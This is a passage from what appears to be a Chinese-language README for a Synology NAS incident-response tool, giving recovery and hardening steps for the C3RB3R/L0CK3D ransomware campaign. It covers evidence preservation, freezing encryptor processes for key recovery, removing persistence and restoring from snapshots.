   - **`external_signins: FAIL`：** 存在来自 `allowed_networks` 之外的成功登录记录；请执行 `nas logs --limit 20000` 与 `nas inventory` 排查是否存在未授权账户、计划任务或套件 ([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware))。
   - **`exploit_attempts: WARN` 或 `exploit_attempts_logs: WARN`，但所有 `ioc_*` 与 `ransomware_files` 均为 `PASS`：** 攻击者曾向 NAS 发送过 CVE-2024-10441 攻击载荷，而 `ioc_cron` / `ioc_binaries` 为 `PASS` 表明未发现被植入的 `/etc/cron.d/synot*` 或 `/bin/libgld` 痕迹；请立即关闭公网暴露面并使用 `nas incident fix` 安装补丁及加固系统 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。
   - **`dsm_version`、`firewall`、`quickconnect`、`router_port_forwarding`、`autoblock`、`smb_min_protocol`、`admin_account`、`snapshot_schedule:<share>` 或 `snapshot_worm:<share>` 为 `FAIL`，但无任何入侵指标：** NAS 尚未打齐补丁或存在暴露面，但尚未被感染；请运行 `nas incident fix --ransom-scan --yes` 执行安全加固 ([Synology C3RB3R statement](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。

## 恢复步骤

### 1. 优先保留证据与内存数据（切勿立即重启或恢复出厂设置）

- **[一手来源]** 立即拔掉 WAN 网线或关闭路由器端口转发，将 NAS 从网络中隔离；仅在无法断开网络连接时才考虑关机，因为关机或重启会销毁易失性内存中的关键取证线索 ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [CISA: I've been hit by ransomware](https://www.cisa.gov/stopransomware/ive-been-hit-ransomware))。
- **[一手来源 / 社区]** 尽管 Synology 的通用勒索软件知识库文章直接建议重置系统，但 Synology 在 2014 年的 SynoLocker 安全公告中曾指出重置会清除解密所需的信息；此外，仅当 `libgld` 加密进程仍在运行且 NAS 未曾重启时，开源工具 `soimy/c3rb3r-rescue` 才有机会尝试从内存（RAM）中提取当次会话的密钥材料（需先用 `kill -STOP` 挂起进程并转储进程内存，切勿直接终止进程）([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware), [Synology SynoLocker advisory](https://www.synology.com/en-uk/security/advisory/SynoLocker), [GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[社区]** `nas incident contain --yes` 可一步完成进程冻结：它会查找疑似加密器的进程（`libgld`、`qnetd`、临时文件夹中的可执行文件、以写入模式打开了 `*.L0CK3D` 或 `read-me3.txt` 文件的进程；可执行文件位于 Synology 系统路径下的进程除打开上述文件外还需具备其他可疑特征才会被列入），向扫描列出的进程（核对相同 PID、启动时间与可执行文件路径）的所有线程发送 `SIGSTOP` 信号，并逐一确认每个线程已进入暂停状态 `T`。PID 1、内核线程以及扫描脚本自身及其父进程绝不会被发送信号。加上 `--stop-sync` 还会同时停止正在运行的 Cloud Sync、Synology Drive、Hyper Backup 与 Container Manager 套件（停止 Container Manager 会停止所有容器）；`--release` 则会向记录的 PID 发送 `SIGCONT` 并重新启动此前停止的套件 ([GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[社区]** `nas incident rescue --yes --capture-dir /SHARE/folder` 可端到端运行完整的 c3rb3r-rescue 救援流程：执行上述冻结步骤、按固定 commit 克隆救援工具库、以 root 身份对每个已冻结的 PID 运行 `capture_process_memory.py` 将内存转储至新建的案件文件夹（必须位于 USB 磁盘或与被加密数据不同的存储空间，按挂载源比对；若需保存在同一存储空间须加 `--force-same-volume`）、将转储数据下载到当前计算机、创建虚拟环境（venv）并通过 `pip --require-hashes` 安装工具库依赖及运行自检，随后运行 `recover_process_key.py` 搜索候选密钥；`--sample FILE` 可在文件副本上测试每个候选密钥，`--decrypt-from DIR --decrypt-to DIR` 可解密文件副本。每个步骤都会记录在工作目录的 `state.json` 中，重复运行同一命令会从上次中断处继续 ([GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue))。
- **[媒体报道]** Guru3d 转述 HKEPC 的建议，呼吁停止 Container Manager 中的所有容器、暂停 Hyper Backup 与 Cloud Sync，并拔掉网线或在路由器上切断内外网的 SMB 访问 ([Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/))。
- **[一手来源]** 在进行任何系统更改前先导出取证记录：保留 `read-me3.txt` 与若干个 `.L0CK3D` 样本文件的副本，导出 Log Center（日志中心）归档，并执行命令保存 `nas --json logs --limit 20000 > logs.json`、`nas --json inventory > inventory.json` 以及 `nas --json incident --deep > incident-deep.json` ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/))。

### 2. 不要支付赎金

- **[一手来源]** FBI 与奇虎 360 均反对支付赎金：支付赎金并不能保证攻击者会提供解密密钥或密钥确实有效，且截至 2026-10-30 尚无针对 C3RB3R 的通用公开解密工具 ([FBI ransomware guidance](https://www.fbi.gov/contact-us/field-offices/memphis/news/press-releases/fbi-memphis-field-office-reminds-tennesseans-about-the-risk-of-ransomware), [360, 2026-10-29](https://www.360.cn/n/13055.html), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。

### 3. 重新联网前彻底清除持久化后门

- **[一手来源 / 社区]** 仅安装 DSM 更新并不会清除攻击者已植入的后门；必须检查并清理 `/etc/cron.d/synot*`、DSM Task Scheduler（任务计划）中的任务、`/bin/libgld`、`/bin/qnetd`、`/bin/l0ck.enc`、未授权的账户或主目录（如 `admin2`）以及 SSH `authorized_keys`，或者在保留取证证据后执行全新重装 DSM ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation), [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

### 4. 从 Btrfs 快照或离线备份恢复数据

- **[社区 / 媒体报道]** 执行恢复前，请先确认目标 Btrfs 快照（`Snapshot Replication > Snapshots > select shared folder > Restore to this snapshot`（Snapshot Replication > 快照 > 选择共享文件夹 > 还原到此快照）或 File Station 中的 `#snapshot`）或离线/异地 Hyper Backup 备份版本的时间戳早于最早一份 `read-me3.txt` 的生成时间 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[一手来源 / 社区]** 恢复数据或重装 DSM 后，在重新接入网络前，请将 DSM 更新至 SA-26:13 修复版本（运行 `nas upgrade --yes`，并核实 `/etc.defaults/VERSION` 中的 `smallfixnumber`）、更新或停用 SA-26:14 涉及的套件、轮换所有管理员与服务密码，并运行 `nas incident --scan --deep` 确认系统处于干净状态 ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 防护建议

- **及时修补 DSM 与套件：** 将 DSM 保持在最新的 SA-26:13 / SA-24:20 修复版本（`nas status`、`nas upgrade --yes`），并针对 SA-26:14 及时更新 Package Center（套件中心）中的套件（`nas inventory`、`nas incident fix --only packages`）([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14))。
- **消除公网暴露面：** 停用 QuickConnect（`nas incident fix --only quickconnect`）、停用 UPnP 路由器端口转发规则（`nas incident fix --only router_port_forwarding`），并启用默认拒绝（default-deny）、仅放行局域网/VPN 网段的 DSM 防火墙（`nas incident fix --only firewall`）([Midnight Blue RISK:STATION](https://www.midnightblue.nl/research/riskstation), [Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7))。
- **加固身份验证与协议：** 停用默认 `admin` 账户、启用双重验证（2-step verification）、开启 AutoBlock（自动封锁），并将最低 SMB 协议版本设为 SMB2（`nas incident fix --only admin_account,autoblock,smb_min_protocol`）([Synology Security Tutorial](https://kb.synology.com/zh-tw/DSM/tutorial/How_to_add_extra_security_to_your_Synology_NAS))。
- **保护快照与离线备份：** 启用定时 Btrfs 快照（并在受支持的机型上启用 Immutable Snapshots 不可变快照，同时通过 `nas incident fix --only snapshot_worm,snapshots --ransom-scan` 避免在不受支持的机型上触发 WORM API 锁死问题），并维护离线或异地的 3-2-1 备份策略 ([Synology Ransomware Prevention Tutorial](https://kb.synology.com/en-global/DSM/tutorial/How_can_I_prevent_ransomeware_attacks_on_my_Synology_device), [Synology WriteOnce KB](https://kb.synology.com/en-global/DSM/tutorial/which_synology_nas_models_support_WriteOnce_and_secure_snapshots))。
- **完整核查清单：** 请参阅 [`HARDENING.md`](HARDENING.md) 获取完整的 DSM 安全加固指南，以及参阅 [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md) 获取被锁定后的解锁与恢复方案 ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide))。
